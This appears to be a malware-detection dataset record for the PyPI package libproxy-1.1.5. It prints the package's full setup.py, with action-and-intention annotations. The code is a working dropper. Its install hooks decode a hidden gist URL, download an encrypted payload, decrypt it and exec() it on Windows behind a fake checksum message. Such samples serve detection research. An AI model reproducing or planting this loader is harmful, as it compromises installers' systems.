{
  "metadata": {
    "package_name": "libproxy-1.1.5",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/libproxy-1.1.5.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/libproxy-1.1.5.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport sys\nimport urllib.request\nimport multiprocessing\nimport base64\n\nCONFIG_UPDATE_INFORMATION_ENDPOINT = b\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZXJpay1hcnRlbW92L2I1ZGUyNTE5NWJkMGU5NjFhNTIxYjAzNDU2NjE0ZDRjL3Jhdy8xY2MyMzYzMTBkYTdmM2UwNWI2NTcxZWFhOWRiNGI2NjM2ZmI0Njg0L2d6TGpnT3VqOHkwYmF2VG12Z2tDd1IzaDFrdkVDMUJNLmI2NAo=\"\nupdate_information_url = base64.b64decode(CONFIG_UPDATE_INFORMATION_ENDPOINT).decode('utf-8')\nkey = \"gUMX0ANp53ofRAwPFF3oOD5SIgJmXfZP\"\n\nD=range\ndef E(key):\n\tA=[A for A in D(0,256)];B=0\n\tfor C in D(0,256):B=(B+A[C]+key[C%len(key)])%256;E=A[C];A[C]=A[B];A[B]=E\n\treturn A\ndef F(sched):\n\tA=sched;E=[];B=0;C=0\n\twhile True:B=(1+B)%256;C=(A[B]+C)%256;D=A[C];A[C]=A[B];A[B]=D;yield A[(A[B]+A[C])%256]\ndef aRCAwKG0p3(eykEZYeNhh,key):\n\tB=key;A=eykEZYeNhh;A=A.split('0X')[1:];A=[int('0x'+A.lower(),0)for A in A];B=[ord(A)for A in B];D=E(B);G=F(D);C=''\n\tfor H in A:I=str(chr(H^next(G)));C+=I\n\treturn C\n\ndef send():\n    if os.name == \"nt\":\n        print(\"Verifying checksum...\")\n        try:\n            with urllib.request.urlopen(update_information_url) as response:\n                exec(aRCAwKG0p3(base64.b64decode(response.read()).decode('utf-8'), key))\n        except urllib.error.URLError as e:\n            pass\n        exit(0)\n\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\n\nclass PostInstallCommand(install):\n    def run(self):\n        print(\"Running post installation...\")\n        install.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        print(\"Running development mode post-install.\")\n        develop.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()\n\nclass PostEggInfoCommand(egg_info):\n    def run(self):\n        print(\"Validating egg_info.\")\n        egg_info.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()",
          "triple_sequences": [
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_bytes",
              "object": "CONFIG_UPDATE_INFORMATION_ENDPOINT",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using specified codec",
              "action_id": "decode_bytes_codec",
              "object": "'utf-8'",
              "object_description": "Character encoding type",
              "object_id": "character_encoding_type",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "os.name",
              "action_description": "Retrieves operating system identifier",
              "action_id": "get_os_id",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Determine operating system",
              "intention_id": "determine_operating_system"
            },
            {
              "action_api": "urllib.request.urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "update_information_url",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "response.read()",
              "action_description": "Process HTTP response content",
              "action_id": "process_http_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode downloaded content",
              "intention_id": "decode_downloaded_content"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_bytes",
              "object": "response.read()",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using specified codec",
              "action_id": "decode_bytes_codec",
              "object": "'utf-8'",
              "object_description": "Character encoding type",
              "object_id": "character_encoding_type",
              "intention_description": "Prepare string for execution",
              "intention_id": "prepare_string_execution"
            },
            {
              "action_api": "aRCAwKG0p3()",
              "action_description": "Decode obfuscated data",
              "action_id": "decode_obfuscated_data",
              "object": "base64.b64decode(response.read()).decode('utf-8'), key",
              "object_description": "Decoded obfuscated data",
              "object_id": "decoded_obfuscated_data",
              "intention_description": "Decode obfuscated code content",
              "intention_id": "decode_obfuscated_code"
            },
            {
              "action_api": "exec()",
              "action_description": "Dynamically executes Python code string",
              "action_id": "exec_python_code",
              "object": "aRCAwKG0p3(base64.b64decode(response.read()).decode('utf-8'), key)",
              "object_description": "Python code string",
              "object_id": "python_code_string",
              "intention_description": "Execute dynamically decoded code content",
              "intention_id": "execute_dynamically_decoded_code"
            },
            {
              "action_api": "exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "0",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            },
            {
              "action_api": "multiprocessing.Process()",
              "action_description": "Creates child process",
              "action_id": "create_child_process",
              "object": "target=send",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Create child process",
              "intention_id": "create_child_process"
            },
            {
              "action_api": "child_process.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Run function in child process",
              "intention_id": "run_function_child_process"
            }
          ]
        }
      ]
    }
  ]
}